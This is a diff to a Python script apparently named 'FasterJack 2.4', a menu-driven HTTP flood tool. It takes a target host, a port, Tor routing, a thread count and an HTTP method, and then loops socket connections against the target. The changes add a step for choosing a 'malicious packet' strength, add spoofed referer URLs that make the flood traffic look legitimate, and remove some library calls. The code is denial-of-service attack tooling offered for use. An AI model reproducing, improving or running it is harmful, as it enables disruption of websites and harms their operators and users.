@@ -79,6 +79,7 @@ nuevo_agente_leng = idioma.nuevo_agente_leng
 nueva_ip_asignada = idioma.nueva_ip_asignada
 o_leng = idioma.o_leng
 opciones_leng = idioma.opciones_leng
+
 package_conf = conf.package_conf
 package_send_it_conf = conf.package_send_it_conf
 puerto_a_usar_leng = idioma.puerto_a_usar_leng
@@ -255,10 +256,10 @@ def clear():
         _ = system('clear')
 
 clear()
-iniciando = "FasterJack 2.4 by NeoJack"
+iniciando = "FasterJack 2.4 by NeoJack" # version
 ini_pro = iniciando.center(50)
 ini_win = window.center(50)
-by = "JUL/2020"
+by = "JUL/2020"                         # Fecha
 ini_by = by.center(50)
 print(aa + "....................................................." + SR)
 print(bb + ini_pro + "   " + SR)
@@ -268,7 +269,7 @@ print(cc + ini_by + "   " + SR)
 print(BM + "                                                     " + SR )
 print(BM + "                                                     \n" + SR)
 print(aa + "....................................................." + SR)
-pa_txt = gg + "1" + ll + "/5"
+pa_txt = gg + "1" + ll + "/6"
 cen_web = web_ip.center(50)
 print(cc + pa_txt + cen_web + SR)
 print(aa + "....................................................." + SR)
@@ -309,7 +310,7 @@ if host == "ERROR":
 clear()
 print(aa + "....................................................." + SR)
 port_txt = puerto_a_usar_leng + ": " + " 80 " + o_leng + " 443"
-pa_txt = gg + "2" + ll + "/5"
+pa_txt = gg + "2" + ll + "/6"
 cen_port = port_txt.center(50)
 print(aa + pa_txt + cen_port + SR)
 print(aa + "....................................................." + SR)
@@ -346,7 +347,7 @@ else:
     http = str("http://")
 clear()
 print(aa + "....................................................." + SR)
-pa_txt = gg + "3" + ll + "/5"
+pa_txt = gg + "3" + ll + "/6"
 cen_tor = tor_txt.center(50)
 print(aa + pa_txt + cen_tor + SR)
 print(aa + "....................................................." + SR)
@@ -402,7 +403,7 @@ else:
 lib.host = host
 clear()
 print(aa + "....................................................." + SR)
-pa_txt = gg + "4" + ll + "/5"
+pa_txt = gg + "4" + ll + "/6"
 cen_cli = cli_txt.center(50)
 print(aa + pa_txt + cen_cli + SR)
 print(aa + "....................................................." + SR)
@@ -415,9 +416,10 @@ if Thr == "":
     thr = Thr
 else:
     thr = Thr
+#####################################    
 clear()
 print(aa +  "....................................................." + SR)
-pa_txt = gg + "5" + ll + "/5"
+pa_txt = gg + "5" + ll + "/6"
 cen_me = me_txt.center(50)
 print(aa + pa_txt + cen_me + SR)
 print(aa + "....................................................." + SR)
@@ -443,7 +445,56 @@ elif Met == "5" or Met == "trace" or Met == "Trace" or Met == "TRACE":
     met = "TRACE"
 else:
     met = "Random"
-lib.we01100010()
+    
+#################################
+# Paquete Malisioso
+clear()
+# Portada
+print(aa +  "....................................................." + SR)
+pac_txt = "Seleccione el tipo de Paquete Malicioso"
+pa_txt = gg + "6" + ll + "/6"
+cen_pac = pac_txt.center(50)
+print(aa + pa_txt + cen_pac + SR)
+print(aa + "....................................................." + SR)
+# tomando variable de config.py
+if package_conf == "basic" or package_conf == "Basic" or package_conf == "b" or package_conf == "B" or package_conf == "BASIC":
+    package_conf = "basic"
+elif package_conf == "normal" or package_conf == "Normal" or package_conf == "n" or package_conf == "N" or package_conf == "NORMAIL":
+    package_conf = "normal"
+elif package_conf == "strong" or package_conf == "Strong" or package_conf == "s" or package_conf == "S" or package_conf == "STRONG":
+    package_conf = "strong"
+else:
+    package_conf = "normal"
+
+#menu
+print(tt + "[" + SR + ff + "+" + SR + tt + "]" + SR + " " + hh + "Defecto: " + ix + "[" + package_conf + "]\n" + SR)
+#
+package_num  =  input(ee + "¿...?: " + sg + "Seleccione el tipo de Paquete?" + " " + hh + "Opciones: " + ix + "[1] " + hh + o_leng + ix + " [2] " + hh + o_leng + ix + " [3]\n" + SR)
+
+if package_num == "":
+    package_conf = conf.package_conf
+
+while (package_num):
+    try:
+        if package_num == "1" or package_num == "basic" or package_num == "Basic" or package_num == "BASIC" or package_num == "b" or package_num == "B":
+            package_conf = "basic"
+            break
+        elif package_num == "2" or package_num == "normal" or package_num == "Normal" or package_num == "NORMAL" or package_num == "n" or package_num == "N":
+            package_conf = "normal"
+            break
+        elif package_num == "3" or package_num == "strong" or package_num == "Strong" or package_num == "STRONG" or package_num == "s" or package_num == "S":  
+            package_conf = "strong"  
+            break
+        elif package_num == "":
+            package_conf = conf.package_conf
+            break
+        else:
+            package_num = "2"
+    except:
+        package_conf = conf.package_conf
+
+#################################    
+    
 http
 host
 port
@@ -451,7 +502,7 @@ thr
 met
 tor
 lis = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_%'
-lib.pro()
+
 def pre():    
     clear()
     print("")
@@ -461,7 +512,7 @@ def pre():
     print(dd + cen_st + "   " + SR)
     print(cc + " " + para_salir_leng + " -->" + qq + " [Ctrl + C] " + oo + or_leng + qq + " [Ctrl + Z]            " + SR)
     print(bb + ".....................................................\n" + SR)
-    lib.pro()
+    
     if tor is True:
         torinfo = str(activado_leng)
     else:
@@ -517,11 +568,18 @@ def referer_url():
     global referer
     referer = []
     referer.append(http + host)
+    referer.append("https://boardreader.com/s/" + host + ".html")
+    referer.append("https://www.ecosia.org/search?q=" + host)
+    referer.append("https://www.qwant.com/?q=" + host)
+    referer.append("https://gibiru.com/results.html?q=" + host)
+    referer.append("https://www.baidu.com/s?wd=" + host)
+    referer.append("https://www.wolframalpha.com/input/?i=" + host)
     referer.append("http://www.google.com/?q=" + host)
     referer.append("http://www.google.com/")
     referer.append("http://www.yahoo.com/")
     referer.append("https://search.yahoo.com/search?p=" + host)
     referer.append("https://www.facebook.com/")
+    referer.append("https://www.instagram.com/")
     referer.append("https://www.fbi.com/")
     referer.append("https://www.bing.com/search?q=" + host)
     referer.append("https://www.bing.com/")
@@ -695,7 +753,7 @@ def bot_reconextando(url):
         time.sleep(.1)
 
 def down_it(item):    
-    lib.pro()
+    
     try:
         while True:
             global met            
@@ -734,7 +792,7 @@ def down_it(item):
                 time.sleep(.1)                 
                 byte = str(len(packet))             
                 if port == "80":
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.SOCK_DGRAM  #socket.SOCK_STREAM
                     s.settimeout(timeout)
                     try:
                         s.connect((host,int(port)))
@@ -754,7 +812,7 @@ def down_it(item):
                     finally:
                         s.close()
                 elif port == "443":
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.SOCK_DGRAM  #socket.SOCK_STREAM
                     s.settimeout(timeout)
                     try:
                         s.connect((host,int(port)))
@@ -850,7 +908,7 @@ def selector():
 
 def iniciando():    
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.SOCK_DGRAM  #socket.SOCK_STREAM
         s.connect((host,int(port)))
         s.settimeout(1)
         print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + target_leng + ": " + mm + str(host) + SR)        
@@ -877,7 +935,7 @@ def ini():
     conec_tor()
     time.sleep(.1)
     iniciando()
-    lib.pro()
+    
     if verif_host_conf == "off" or verif_host_conf == "OFF" or verif_host_conf == "Off":
         print(tt + "[" + SR + gg + "!" + SR + tt + "]" + SR + " " + hh + verificando_leng + ": " + mm + host + hh + " : " + mm + str(port) + SR)    
     load = tt + "[" + SR + ss + "!" + SR + tt + "]" + SR + " " + ee + loading_leng + ": " + SR
